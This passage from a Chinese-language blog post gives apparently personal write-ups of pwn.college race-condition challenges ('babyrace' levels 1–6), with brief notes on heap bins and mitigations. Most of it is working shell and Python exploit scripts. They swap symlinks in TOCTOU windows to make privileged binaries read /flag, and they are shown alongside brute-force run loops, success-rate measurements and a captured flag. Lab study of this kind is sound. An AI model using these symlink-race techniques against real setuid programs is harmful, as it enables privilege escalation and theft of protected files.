<strong>free()d</strong> chunks that don’t fit into tcache orfastbins</li><li>64 doubly-linked “small” bins for allocations up to 512 bytes</li><li>doubly-linked “large” bins (anything over 512 bytes) that contain different-sized chunks</li></ul></li><li><p>The Unlink Attack, Poison Null Byte</p></li><li><p><a href="https://docs.google.com/presentation/d/14SYq0TTVxEGWHNUG1BP66A8liPDD2pqJUs2WrXlCZNE/edit#slide=id.g47fd1f5b33_0_204">further reading</a>. </p></li></ul><p><a href="https://sourceware.org/glibc/wiki/MallocInternals">malloc internals</a> </p><p><a href="https://seclists.org/bugtraq/2005/Oct/118">the rise of houses</a> </p><h1 id="module-C-race"><a href="#module-C-race" class="headerlink" title="module C-race"></a>module C-race</h1><h4 id="key-points"><a href="#key-points" class="headerlink" title="key points"></a>key points</h4><ul><li>在一个程序打开文件并写入然后再到执行它的期间进程可能被调度, 这个时候如果文件被改写那么就会出现竞态条件.</li><li>如果这个窗口太短那么竞态条件出现的几率就会更小</li><li>有一个系统调用<strong>nice</strong>, 对应于nice命令, 还有一个ionice, 就是字面意思上的run a program with modified scheduling priority</li><li>通过非常长的路径搜索可以减慢程序执行, 进而加大竞态窗口. 可以使用符号链接来循环查找同一根目录下的多条长路径, 来达到同样的效果.</li></ul><img src="../../image/pwn-modules/image-20220511235547367.png" alt="image-20220511235547367" style="zoom: 67%;" /><ul><li>Mitigations<ol><li>Safer programming practices (O_NOFOLLOW, mkstemp(), etc).</li><li>Symlink protections in /tmp<br> a. root cannot follow symlinks in /tmp that are owned by other users<br> b.specifically made to prevent these sorts of issues</li></ol></li><li>非libc的库函数要直接进行编译要给gcc传递相应的链接参数.</li><li>pthread:<ul><li><code>pthread_t</code> | <code>pthread_create()</code> | <code>pthread_join()</code>:waits for the thread specified by thread to terminate.</li><li>实际用的是<code>clone()</code>系统调用.</li></ul></li><li>discrepancies between <strong>libc call</strong> and <strong>raw syscall</strong>: <ul><li>setuid() in libc sets the uid for all threads of the process, raw syscall will only set the caller thread.</li><li>exit() in libc will call exit_group(), so exit all threads, but raw syscall only exit caller thread.</li></ul></li><li>实际中常使用全局变量来控制线程的执行.</li><li>对内存的读写同样会产生竞态条件.</li><li>Data races: 自增的多步骤指令. 不过可以通过上锁解决.</li><li>Detect: valgrind, <a href="https://docs.google.com/presentation/d/1u-aSz-mqwkMIZEDAR-AEPKw5JPn-1q_3Ek_C6JjQUzY/edit#slide=id.gac4ec7d1a7_0_49">学术界</a> </li><li>signals and reentrancy: <ul><li>use signal to interrupt normal execution control flow.</li><li>use signal function to reenter function.</li><li>DO NOT call non-reentrant funtions in your signal handlers.<ul><li>Your handler might have interrupted those functions mid-execution.</li><li>Another signal might interrupt your signal handler’s non-reentrant invocations mid-execution!</li><li>Depending on settings (<code>SA_NODEFER</code> flag to sigaction()), another iteration of the same signal might interrupt your signal!</li></ul></li><li><code>man signal-safety</code> to see all reentrant libc funtions.</li></ul></li></ul><blockquote><p>YouTube-50是babyrace的视频. level5做不下去了准备看看.</p></blockquote><p><strong>补充:</strong> </p><ul><li><p>level5 shell script问题出在rm mv都有一个启动时间和一堆系统调用, 再加上shell是靠fork+exec来执行进程的, 所以就会比较慢, 可能会出现左图中的情况, 就算把几个命令分开进多个循环也还是太慢. 如果写进c, 那就是右图中的理想状态了:<br><img src="../../image/pwn-modules/image-20220516162810899.png" alt="image-20220516162810899" style="zoom:80%;" /><img src="../../image/pwn-modules/image-20220516163018313.png" alt="image-20220516162810899" style="zoom:80%;" /> </p></li><li><p>使用python的话启动比较慢是事实, 但是进入执行之后到系统调用层面是和c差不多的, 所以只要在python里面进行loop就能达到一样的效果. 想起来前几天看的dirty cow使用的race condition的poc就是用c写的.</p><ul><li>python的话要大量使用到os module来调用系统. 可得好好看看.(练了练shell也不亏就是了)</li></ul></li></ul><h4 id="prepare"><a href="#prepare" class="headerlink" title="prepare"></a>prepare</h4><p>先整个创建超级长的路径的脚本. 顺便学了学shell编程.</p><p>难怪视频里只见到t_end, 因为这样路径上每个文件夹其实都是符号链接, 所以最多20个.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>prefix=&#x27;a&#x27;<br>ln -s $(pwd) ./root<br>for i in &#123;97..116&#125;#或者直接用&#123;a..t&#125;<br>do<br>    prefix=$(printf &quot;\\x$(printf %x $i)&quot;)<br>    pushd .<br>    mkdir $prefix<br>    cd $prefix<br>    for j in &#123;1..25&#125;<br>    do<br>        mkdir ./$j<br>        cd ./$j<br>    done<br>    innerwd=$(pwd)<br>    popd<br>    cp -a ./root $innerwd<br>    ln -s $innerwd $(pwd)/$&#123;prefix&#125;_end<br>done<br></code></pre></div></td></tr></table></figure><p>生成路径字符串: 如果路径上还有符号链接那还得再减少几个.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>prefix=&#x27;a&#x27;<br>path=&#x27;./&#x27; <br>for i in &#123;97..116&#125; #或者直接用&#123;a..t&#125;<br>do<br>    prefix=$(printf &quot;\\x$(printf %x $i)&quot;)<br>    path+=$&#123;prefix&#125;_end/root/<br><br>done<br>ls $path#test path(though must be true...)<br><span class="hljs-meta">#</span><span class="bash">result is:</span><br>./a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/s_end/root/t_end/root/<br></code></pre></div></td></tr></table></figure><h4 id="level1-2"><a href="#level1-2" class="headerlink" title="level1"></a>level1</h4><p>在程序使用第一个参数当做字符串open文件之前直接停下来等我, 这个时候就可以更改flag的符号链接为那个名字, 于是绕过了不能含有’flag’字符和不能是符号链接的限制.</p><h5 id="1程序的补充shell"><a href="#1程序的补充shell" class="headerlink" title=".1程序的补充shell"></a>.1程序的补充shell</h5><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>rm aa bb cc 2&gt;/dev/null<br>touch aa<br>ln -s /flag ./cc<br><span class="hljs-meta">#</span><span class="bash">一开始是一个普通文件, 然后改成到/flag的符号链接</span><br>while [ 1 ]<br>do<br>    #sleep 0.05 #不知道有没有用的说...希望有. 果然没用<br>    mv bb aa <br>    sleep 0.0005<br>    mv aa bb<br>    mv cc aa<br>    sleep 0.0005<br>    mv aa cc<br>done<br></code></pre></div></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta">#</span><span class="bash">持续执行challenge的shell</span><br><br>path=./a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/s_end/root/<br><br>while [[ 1 ]]<br>do<br>    res=$(/challenge/babyrace_level1.1 $&#123;path&#125;aa | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        printf &quot;\n$res\n\n&quot;<br>        exit<br>    fi<br>done<br></code></pre></div></td></tr></table></figure><p>删除一堆文件夹:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">rm -r !(peda|*sh)<br></code></pre></div></td></tr></table></figure><h5 id="成功率比较"><a href="#成功率比较" class="headerlink" title="成功率比较"></a>成功率比较</h5><blockquote><p>改成短路径之后进行了一下成功率比较:</p></blockquote><p>比较shellscript: </p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta">#</span><span class="bash">持续执行challenge的shell</span><br><br>path=./a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/s_end/root/<br>path_2=./a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/s_end/root/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/<br>rate=0<br>rates=0<br>ratess=0<br>for i in &#123;1..1000&#125;<br>do<br>    res=$(/challenge/babyrace_level1.1 $&#123;path&#125;aa | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        ((rate++))<br>    fi<br><br>    res=$(/challenge/babyrace_level1.1 $&#123;path_2&#125;aa | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        ((ratess++))<br>    fi<br><br>    res=$(/challenge/babyrace_level1.1 ./aa | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        ((rates++))<br>    fi<br>done<br>echo longpath: $rate/1000<br>echo path_2: $ratess/1000<br>echo shortpath: $rates/1000<br></code></pre></div></td></tr></table></figure><p>结果:</p><p>不带sleep:</p><img src="../../image/pwn-modules/image-20220515153055539.png" alt="image-20220515153055539" style="zoom:80%;" /><p>带了sleep(0.05s):</p><img src="../../image/pwn-modules/image-20220515153138069.png" alt="image-20220515153138069" style="zoom:80%;" /><p>和好多因素有关, 不过不用sleep看起来更高效, 但是没见到长路径带来的好处…….</p><p>好了, 有了新发现, 产生竞态条件的shell脚本中第一个sleep看起来没什么意义然后尝试删除, <strong>成功率直接大幅上涨</strong>:</p><img src="../../image/pwn-modules/image-20220515155725438.png" alt="image-20220515155725438" style="zoom:80%;" /><p>不过长路径还是没啥作用. 如果不加上<strong>sleep 0.0005</strong>, 那么成功率直降为5/1000.</p><p>会随着sleep的时间波动, 还是0.0005最高. 在0.005的时候出现path_2的成功率最高. 全都是迷之行为, 至于nice就不试了….</p><h4 id="level2-2"><a href="#level2-2" class="headerlink" title="level2"></a>level2</h4><p>完全一样</p><h4 id="level3-3"><a href="#level3-3" class="headerlink" title="level3"></a>level3</h4><p>在前两题的基础之上检查大小不能超过256字节, 而且在buf[256]之后有一个控制进入win()的v7, 改改文件名很容易绕过</p><p>看了office hours, 用了python的os模块, 尝试了os.fork+分开unlink和symlink+strace程序的系统调用时间并分析窗口(这个窗口比较小). 没试出来什么更好的结果. </p><h4 id="level4-4"><a href="#level4-4" class="headerlink" title="level4"></a>level4</h4><p>利用上面的方法更改打开文件进行栈溢出然后改跳转地址跳转到win().</p><p>什么保护都没开, 固定地址加载.</p><h4 id="level5-5"><a href="#level5-5" class="headerlink" title="level5"></a>level5</h4><blockquote><p>思考的一些过程……</p><p>接受一个绝对路径, 除了一些检查(symlink, argname), 还有文件所在目录所有者只能是root, 其他用户没有在此文件夹写的权限.</p><p>???? 不过在看了看dirname的实现之后发现并不需要一个绝对路径.</p><img src="../../image/pwn-modules/image-20220512222315120.png" alt="image-20220512222315120" style="zoom:80%;" /><ul><li>这样的话, <del>参数就定成/home/hacker下的e(0 size file),</del>  </li></ul></blockquote><p>dirname()只是一个字符串操作, 会截取前面的一部分路径. 所以不能在参数中使用相对路径, 否则dirname会返回当前文件夹: <code>.</code>, 这样没法绕过dirname, 工作目录又不能改成除了hacker之外的.</p><p>第一阶段只判断了文件存在与否以及符号链接(no follow lstat), 第二阶段才判断目录信息(use dirname() strip argv[1], and follow link stat), 第三阶段是真正的打开文件.</p><ul><li>首先touch一个/home/hacker/aa/bb文件, 通过name和symlink验证, </li><li>然后ln两个/home/hacker/aa -&gt; /home, 不用管bb其实根本不在/home中.</li><li>最后再ln一个/home/hacker/aa/bb -&gt; /flag</li></ul><p>也许有更好的办法, :</p><ul><li>最开始创建<code>./1/aa/bb(plain file)</code>, <code>./2/aa -&gt; /home</code>, <code>./3/aa/bb -&gt; /flag</code></li><li>然后创建一个symlink叫做dir.</li><li>首先指向<code>./1</code>, 然后指向<code>./2</code>, 最后指向<code>./3</code>.</li><li>这样只要每次unlink dir然后再symlink相应数字文件夹名就行了.<br>完整路径名为<code>/home/hacker/dir/aa/bb</code> </li><li>由于这样子实在太快导致窗口时间都跟不上了. 添加sleep, 大概是0.0001s</li></ul><h5 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h5><p>写了一个脚本避免重复输入一些命令, 不过想清楚之后倒是一遍过了.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>if [ $1 == &#x27;init&#x27; ]<br>then<br>    cd<br>    mkdir a<br>    cd a<br>    touch b<br>elif [ $1 == 2 ]<br>then<br>    cd<br>    mv a b<br>    ln -s /home /home/hacker/a<br>elif [ $1 == 3 ]<br>then<br>    cd<br>    rm a ./b/b<br>    mv b a<br>    ln -s /flag /home/hacker/a/b<br>elif [ $1 == &#x27;cls&#x27; ]<br>then<br>    rm -r a b 2&gt;/dev/null<br>else<br>    echo &#x27;invalid argument&#x27;<br>fi<br></code></pre></div></td></tr></table></figure><p>woc, 我就说怎么不太像竞态条件, 原来.0只是教学, .1都没有getchar()这个函数了.</p><p>重新做一下.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>rm aa bb cc -rf 2&gt;/dev/null<br>mkdir aa<br>touch ./aa/bb<br>ln -s /home /home/hacker/cc<br>ln -s /flag /home/hacker/aa/cc<br><span class="hljs-meta">#</span><span class="bash">sleep 0.0005</span><br>while [ 1 ]<br>do<br>    sleep 0.0005<br>    mv aa bb#change dir name<br>    mv cc aa#let aa-&gt;/home<br>    sleep 0.0005<br>    <br>    mv aa cc #now cc -&gt; /home, bb is dirctory<br>    mv bb aa #restore aa(dir)<br>    mv ./aa/bb ./aa/dd<br>    mv ./aa/cc ./aa/bb #now ./aa has bb-&gt;/flag, dd plainfile<br>    sleep 0.0005<br>    <br>    #restore context, for non-symlink check<br>    mv ./aa/bb ./aa/cc<br>    mv ./aa/dd ./aa/bb<br>done<br></code></pre></div></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta">#</span><span class="bash">持续执行challenge的shell</span><br><br>while [[ 1 ]]<br>do<br>    res=$(/challenge/babyrace_level5.1 /home/hacker/aa/bb | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        printf &quot;\n$res\n\n&quot;<br>        exit<br>    fi<br>done<br></code></pre></div></td></tr></table></figure><p>过不了啊啊啊…</p><h5 id="python大法-key补充"><a href="#python大法-key补充" class="headerlink" title="python大法+key补充"></a>python大法+key补充</h5><ul><li>unlink: delete a name from filesystem. 真是个集合了一堆功能的系统调用, 能删 文件 symlink socket FIFO device.</li><li>一些常数是用os.CONSTANT来调用的.</li><li>如果使用python的builtin function <code>open</code>的话, 会调用fstat ioctl这种没有什么必要的函数. 可以使用os.open来调用低级的函数.</li></ul><p>看视频尝试python写法:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os,sys,time<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> symlink, unlink<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;rm&#x27;</span>:<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        exit()<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;init&#x27;</span> :<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        os.system(<span class="hljs-string">&#x27;./initpy&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    time.sleep(<span class="hljs-number">0.0001</span>)<br>    <span class="hljs-comment">#now dir -&gt; 1, need to be unlinked</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./2&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br><br>    <span class="hljs-comment">#now change dir to 3</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./3&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    time.sleep(<span class="hljs-number">0.00003</span>)<br>    <br>    <span class="hljs-comment">#now restore context</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./1&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>initpy:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>mkdir -p ./1/aa<br>touch ./1/aa/bb<br><br>mkdir -p ./2<br>ln -s /home ./2/aa #这里还出错过.<br><br>mkdir -p ./3/aa<br>ln -s /flag ./3/aa/bb<br><br>ln -s /home/hacker/1 ./dir<br></code></pre></div></td></tr></table></figure><p>测试:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">(for i in &#123;1..1000&#125;;do /challenge/babyrace_level5.1 ./dir/aa/bb;done) | egrep &#x27;Error|pwn&#x27; | sort | uniq -c<br></code></pre></div></td></tr></table></figure><p>结果:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">    356 Error: directory not owned by root!<br>     44 Error: failed to get directory status!<br>    116 Error: failed to get file status!<br>    472 Error: file is a symlink!<br>      3 pwn.college&#123;ojL-wiqjv9XYN-GR2XsuQ-yucpZ.QXwEDNsMTM1IzW&#125;<br>or<br>5218 Error: directory not owned by root!<br>    896 Error: failed to get directory status!<br>   1300 Error: failed to get file status!<br>   2422 Error: file is a symlink!<br>     19 pwn.college&#123;ojL-wiqjv9XYN-GR2XsuQ-yucpZ.QXwEDNsMTM1IzW&#125;<br></code></pre></div></td></tr></table></figure><p>成功率最多就是20/10000, 2‰…….看视频去了, 不知道有没更好的. 太玄学了, 而且这是只是在一个4 core docker里面, 现实机器那不得更多进程+更多cpu内核+奇怪调度算法, 那是我能研究的?直接下一题, cow也是直接上大数量循环. </p><h4 id="level6-5"><a href="#level6-5" class="headerlink" title="level6"></a>level6</h4><p>和上一题相同, 不过dirname之后使用的是lstat, 不follow symlink……</p><p>???????????????????????????????</p><ul><li>首先touch一个/home/hacker/a/home/b文件, 通过name和symlink验证, </li><li>然后ln两个/home/hacker/a -&gt; /, 那么原path的dirname就是指: /home/hacker/a/home</li><li>最后再ln一个/home/hacker/a/home/b -&gt; /flag</li></ul><p>改版:</p><ul><li>首先touch一个/home/hacker/1/a/home/b文件, 通过name和symlink验证, </li><li>然后ln个/home/hacker/2/a -&gt; /, 那么原path的dirname就是指: /home/hacker/dir(2)/a/home</li><li>最后再ln一个/home/hacker/3(dir)/a/home/b -&gt; /flag</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>if [ $1 == &#x27;init&#x27; ]<br>then<br>    cd<br>    mkdir -p a/home<br>    touch a/home/b<br>elif [ $1 == 2 ]<br>then<br>    cd<br>    mv a b<br>    ln -s / /home/hacker/a<br>elif [ $1 == 3 ]<br>then<br>    cd<br>    rm a ./b/home/b<br>    mv b a<br>    ln -s /flag /home/hacker/a/home/b<br>elif [ $1 == &#x27;cls&#x27; ]<br>then<br>    rm -r a b 2&gt;/dev/null<br>else<br>    echo &#x27;invalid argument&#x27;<br>fi<br></code></pre></div></td></tr></table></figure><h5 id="python"><a href="#python" class="headerlink" title="python:"></a>python:</h5><p>unlink symlink只要0.000035s就可以完成系统调用.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os,sys,time<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> symlink, unlink<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;rm&#x27;</span>:<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        exit()<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;init&#x27;</span> :<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        os.system(<span class="hljs-string">&#x27;./initpy&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    time.sleep(<span class="hljs-number">0.0001</span>)<br>    <span class="hljs-comment">#now dir -&gt; 1, need to be unlinked</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./2&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br><br>    <span class="hljs-comment">#now change dir to 3</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./3&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    time.sleep(<span class="hljs-number">0.00003</span>)<br>    <br>    <span class="hljs-comment">#now restore context</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./1&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>initpy:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>mkdir -p ./1/a/home<br>touch ./1/a/home/b<br><br>mkdir -p ./2<br>ln -s / ./2/a<br><br>mkdir -p ./3/a/home<br>ln -s /flag ./3/a/home/b<br><br>ln -s 